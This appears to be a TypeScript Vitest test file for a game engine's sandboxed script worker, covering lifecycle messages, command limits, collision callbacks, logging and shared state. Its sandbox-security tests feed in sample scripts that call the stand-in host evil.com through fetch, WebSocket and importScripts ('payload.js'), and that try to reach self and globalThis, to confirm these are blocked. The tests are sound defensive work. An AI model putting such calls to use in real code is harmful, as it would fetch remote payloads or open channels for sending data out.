/**
 * Integration tests for the script worker.
 *
 * These tests simulate the Web Worker environment by stubbing `self` and
 * dynamically importing the worker module. This lets us test the actual
 * worker code — init, tick, stop, collision routing, command limits,
 * and sandbox security — without a real browser Worker.
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';

// Collected messages from the worker's postMessage calls
let postedMessages: Array<Record<string, unknown>> = [];

// The worker's onmessage handler, set during module import
let workerOnMessage: ((e: { data: Record<string, unknown> }) => void) | null = null;

/**
 * Helper: send a message to the worker (simulates host -> worker).
 */
function sendToWorker(data: Record<string, unknown>) {
  if (workerOnMessage) {
    workerOnMessage({ data });
  }
}

/**
 * Helper: get all posted messages of a specific type.
 */
function getMessages(type: string) {
  return postedMessages.filter(m => m.type === type);
}

/**
 * Helper: clear collected messages.
 */
function clearMessages() {
  postedMessages = [];
}

// Before each test: set up a fresh worker environment
beforeEach(async () => {
  postedMessages = [];
  workerOnMessage = null;

  // Reset modules so the worker re-initializes fresh
  vi.resetModules();

  // Stub the global `self` to simulate Web Worker environment
  const mockSelf = {
    postMessage: (msg: Record<string, unknown>) => {
      postedMessages.push(structuredClone(msg));
    },
    onmessage: null as ((e: { data: Record<string, unknown> }) => void) | null,
  };

  // The worker accesses `self` directly — stub it globally
  vi.stubGlobal('self', mockSelf);

  // Dynamically import the worker — it sets self.onmessage at module scope
  // @ts-ignore — scriptWorker.ts is a Web Worker script, not a module
  await import('../scriptWorker');

  // Capture the onmessage handler that was set during import
  workerOnMessage = mockSelf.onmessage;
});

describe('scriptWorker integration', () => {
  describe('init message', () => {
    it('should initialize scripts and call onStart', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'player',
            source: 'function onStart() { forge.log("started"); }',
            enabled: true,
          },
        ],
        entities: {},
        entityInfos: {},
      });

      const logs = getMessages('log');
      expect(logs.length).toBeGreaterThanOrEqual(1);
      expect(logs[0].message).toBe('started');
      expect(logs[0].entityId).toBe('player');
    });

    it('should skip disabled scripts', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'disabled-entity',
            source: 'function onStart() { forge.log("should not run"); }',
            enabled: false,
          },
        ],
        entities: {},
      });

      const logs = getMessages('log');
      expect(logs).toHaveLength(0);
    });

    it('should report compilation errors', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'bad-script',
            source: 'function onStart( { // syntax error',
            enabled: true,
          },
        ],
        entities: {},
      });

      const errors = getMessages('error');
      expect(errors.length).toBeGreaterThanOrEqual(1);
      expect(errors[0].entityId).toBe('bad-script');
      expect((errors[0].message as string)).toContain('Compilation error');
    });

    it('should report onStart runtime errors', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'crash-entity',
            source: 'function onStart() { throw new Error("boom"); }',
            enabled: true,
          },
        ],
        entities: {},
      });

      const errors = getMessages('error');
      expect(errors.length).toBeGreaterThanOrEqual(1);
      expect((errors[0].message as string)).toContain('boom');
    });

    it('should handle multiple scripts', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          { entityId: 'e1', source: 'function onStart() { forge.log("first"); }', enabled: true },
          { entityId: 'e2', source: 'function onStart() { forge.log("second"); }', enabled: true },
        ],
        entities: {},
      });

      const logs = getMessages('log');
      expect(logs).toHaveLength(2);
      expect(logs[0].message).toBe('first');
      expect(logs[1].message).toBe('second');
    });
  });

  describe('tick message', () => {
    it('should call onUpdate with delta time', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'ticker',
            source: 'function onUpdate(dt) { forge.log("dt=" + dt.toFixed(3)); }',
            enabled: true,
          },
        ],
        entities: {},
      });
      clearMessages();

      sendToWorker({ type: 'tick', dt: 0.016, elapsed: 0.5, entities: {} });

      const logs = getMessages('log');
      expect(logs).toHaveLength(1);
      expect(logs[0].message).toBe('dt=0.016');
    });

    it('should report onUpdate runtime errors', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'crash-tick',
            source: 'function onUpdate() { throw new Error("tick crash"); }',
            enabled: true,
          },
        ],
        entities: {},
      });
      clearMessages();

      sendToWorker({ type: 'tick', dt: 0.016, entities: {} });

      const errors = getMessages('error');
      expect(errors.length).toBeGreaterThanOrEqual(1);
      expect((errors[0].message as string)).toContain('tick crash');
    });
  });

  describe('stop message', () => {
    it('should call onDestroy on all scripts', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'destroyable',
            source: 'function onDestroy() { forge.log("destroyed"); }',
            enabled: true,
          },
        ],
        entities: {},
      });
      clearMessages();

      sendToWorker({ type: 'stop' });

      const logs = getMessages('log');
      expect(logs).toHaveLength(1);
      expect(logs[0].message).toBe('destroyed');
    });

    it('should clear UI elements on stop', () => {
      sendToWorker({
        type: 'init',
        scripts: [{ entityId: 'e1', source: '', enabled: true }],
        entities: {},
      });
      clearMessages();

      sendToWorker({ type: 'stop' });

      const uiMessages = getMessages('ui');
      expect(uiMessages.length).toBeGreaterThanOrEqual(1);
      expect(uiMessages[0].elements).toEqual([]);
    });
  });

  describe('command dispatch', () => {
    it('should collect commands from forge API calls', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'mover',
            source: `
              function onStart() {
                forge.setPosition('mover', 10, 20, 30);
              }
            `,
            enabled: true,
          },
        ],
        entities: { mover: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
        entityInfos: { mover: { name: 'Mover', type: 'Cube', colliderRadius: 1 } },
      });

      const cmdMessages = getMessages('commands');
      expect(cmdMessages.length).toBeGreaterThanOrEqual(1);

      const commands = cmdMessages[0].commands as Array<Record<string, unknown>>;
      const transformCmd = commands.find(c => c.cmd === 'update_transform');
      expect(transformCmd).toBeDefined();
    });

    it('should enforce per-frame command limit', () => {
      // Script that emits 150 commands (exceeds MAX_COMMANDS_PER_FRAME = 100)
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'spammer',
            source: `
              function onStart() {
                for (let i = 0; i < 150; i++) {
                  forge.setPosition('spammer', i, 0, 0);
                }
              }
            `,
            enabled: true,
          },
        ],
        entities: { spammer: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
        entityInfos: { spammer: { name: 'Spammer', type: 'Cube', colliderRadius: 1 } },
      });

      // Should get an error about command limit
      const errors = getMessages('error');
      const limitError = errors.find(e =>
        typeof e.message === 'string' && e.message.includes('Command limit exceeded')
      );
      expect(limitError).toBeDefined();

      // Commands should be truncated to 100
      const cmdMessages = getMessages('commands');
      if (cmdMessages.length > 0) {
        const commands = cmdMessages[0].commands as Array<unknown>;
        expect(commands.length).toBeLessThanOrEqual(100);
      }
    });
  });

  describe('sandbox security', () => {
    it('should prevent fetch access from scripts', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'malicious',
            source: `
              function onStart() {
                try {
                  fetch('https://evil.com');
                  forge.log('fetch succeeded');
                } catch (e) {
                  forge.log('fetch blocked: ' + e.message);
                }
              }
            `,
            enabled: true,
          },
        ],
        entities: {},
      });

      const logs = getMessages('log');
      // fetch should be undefined, causing a TypeError
      expect(logs.length).toBeGreaterThanOrEqual(1);
      expect((logs[0].message as string)).toContain('fetch blocked');
    });

    it('should prevent WebSocket access from scripts', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'ws-attempt',
            source: `
              function onStart() {
                try {
                  new WebSocket('ws://evil.com');
                  forge.log('ws succeeded');
                } catch (e) {
                  forge.log('ws blocked: ' + e.message);
                }
              }
            `,
            enabled: true,
          },
        ],
        entities: {},
      });

      const logs = getMessages('log');
      expect(logs.length).toBeGreaterThanOrEqual(1);
      expect((logs[0].message as string)).toContain('ws blocked');
    });

    it('should prevent XMLHttpRequest access from scripts', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'xhr-attempt',
            source: `
              function onStart() {
                try {
                  new XMLHttpRequest();
                  forge.log('xhr succeeded');
                } catch (e) {
                  forge.log('xhr blocked: ' + e.message);
                }
              }
            `,
            enabled: true,
          },
        ],
        entities: {},
      });

      const logs = getMessages('log');
      expect(logs.length).toBeGreaterThanOrEqual(1);
      expect((logs[0].message as string)).toContain('xhr blocked');
    });

    it('should prevent importScripts access from scripts', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'import-attempt',
            source: `
              function onStart() {
                try {
                  importScripts('https://evil.com/payload.js');
                  forge.log('import succeeded');
                } catch (e) {
                  forge.log('import blocked: ' + e.message);
                }
              }
            `,
            enabled: true,
          },
        ],
        entities: {},
      });

      const logs = getMessages('log');
      expect(logs.length).toBeGreaterThanOrEqual(1);
      expect((logs[0].message as string)).toContain('import blocked');
    });

    it('should shadow self and globalThis in scripts', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'escape-attempt',
            source: `
              function onStart() {
                forge.log('self=' + typeof self + ',globalThis=' + typeof globalThis);
              }
            `,
            enabled: true,
          },
        ],
        entities: {},
      });

      const logs = getMessages('log');
      expect(logs.length).toBeGreaterThanOrEqual(1);
      expect(logs[0].message).toBe('self=undefined,globalThis=undefined');
    });
  });

  describe('collision event routing', () => {
    it('should route collision enter to registered callbacks', () => {
      // forge.physics.onCollisionEnter(entityId, callback) registers per-entity
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'player',
            source: `
              function onStart() {
                forge.physics.onCollisionEnter('player', (other) => {
                  forge.log('hit: ' + other);
                });
              }
            `,
            enabled: true,
          },
        ],
        entities: { player: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
        entityInfos: { player: { name: 'Player', type: 'Cube', colliderRadius: 1 } },
      });
      clearMessages();

      // Send collision event
      sendToWorker({
        type: 'COLLISION_EVENT',
        entityA: 'player',
        entityB: 'enemy',
        started: true,
      });

      const logs = getMessages('log');
      expect(logs).toHaveLength(1);
      expect(logs[0].message).toBe('hit: enemy');
    });

    it('should route collision exit to exit callbacks', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'player',
            source: `
              function onStart() {
                forge.physics.onCollisionExit('player', (other) => {
                  forge.log('left: ' + other);
                });
              }
            `,
            enabled: true,
          },
        ],
        entities: { player: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
        entityInfos: { player: { name: 'Player', type: 'Cube', colliderRadius: 1 } },
      });
      clearMessages();

      sendToWorker({
        type: 'COLLISION_EVENT',
        entityA: 'player',
        entityB: 'wall',
        started: false,
      });

      const logs = getMessages('log');
      expect(logs).toHaveLength(1);
      expect(logs[0].message).toBe('left: wall');
    });

    it('should fire callbacks for both entities in a collision', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'a',
            source: `function onStart() { forge.physics.onCollisionEnter('a', (other) => forge.log('a hit ' + other)); }`,
            enabled: true,
          },
          {
            entityId: 'b',
            source: `function onStart() { forge.physics.onCollisionEnter('b', (other) => forge.log('b hit ' + other)); }`,
            enabled: true,
          },
        ],
        entities: {
          a: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] },
          b: { position: [1, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] },
        },
        entityInfos: {
          a: { name: 'A', type: 'Cube', colliderRadius: 1 },
          b: { name: 'B', type: 'Cube', colliderRadius: 1 },
        },
      });
      clearMessages();

      sendToWorker({
        type: 'COLLISION_EVENT',
        entityA: 'a',
        entityB: 'b',
        started: true,
      });

      const logs = getMessages('log');
      expect(logs).toHaveLength(2);
      expect(logs[0].message).toBe('a hit b');
      expect(logs[1].message).toBe('b hit a');
    });

    it('should handle collision callback errors gracefully', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'crasher',
            source: `
              function onStart() {
                forge.physics.onCollisionEnter('crasher', () => { throw new Error('callback crash'); });
              }
            `,
            enabled: true,
          },
        ],
        entities: { crasher: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
        entityInfos: { crasher: { name: 'Crasher', type: 'Cube', colliderRadius: 1 } },
      });
      clearMessages();

      sendToWorker({
        type: 'COLLISION_EVENT',
        entityA: 'crasher',
        entityB: 'other',
        started: true,
      });

      const errors = getMessages('error');
      expect(errors.length).toBeGreaterThanOrEqual(1);
      expect((errors[0].message as string)).toContain('callback crash');
    });

    it('should not fire if no callbacks registered', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          { entityId: 'passive', source: 'function onStart() {}', enabled: true },
        ],
        entities: {},
      });
      clearMessages();

      sendToWorker({
        type: 'COLLISION_EVENT',
        entityA: 'passive',
        entityB: 'other',
        started: true,
      });

      const logs = getMessages('log');
      expect(logs).toHaveLength(0);
    });
  });

  describe('forge.log levels', () => {
    it('should support log, warn, and error levels', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'logger',
            source: `
              function onStart() {
                forge.log("info msg");
                forge.warn("warn msg");
                forge.error("error msg");
              }
            `,
            enabled: true,
          },
        ],
        entities: {},
      });

      const logs = getMessages('log');
      expect(logs).toHaveLength(3);
      expect(logs[0]).toEqual(expect.objectContaining({ level: 'info', message: 'info msg' }));
      expect(logs[1]).toEqual(expect.objectContaining({ level: 'warn', message: 'warn msg' }));
      expect(logs[2]).toEqual(expect.objectContaining({ level: 'error', message: 'error msg' }));
    });
  });

  describe('shared state', () => {
    it('should allow scripts to share state via forge.state', () => {
      sendToWorker({
        type: 'init',
        scripts: [
          {
            entityId: 'writer',
            source: `function onStart() { forge.state.set('score', 42); }`,
            enabled: true,
          },
          {
            entityId: 'reader',
            source: `function onStart() { forge.log('score=' + forge.state.get('score')); }`,
            enabled: true,
          },
        ],
        entities: {},
      });

      const logs = getMessages('log');
      const scoreLog = logs.find(l => typeof l.message === 'string' && l.message.includes('score='));
      expect(scoreLog).toBeDefined();
      expect(scoreLog!.message).toBe('score=42');
    });
  });
});
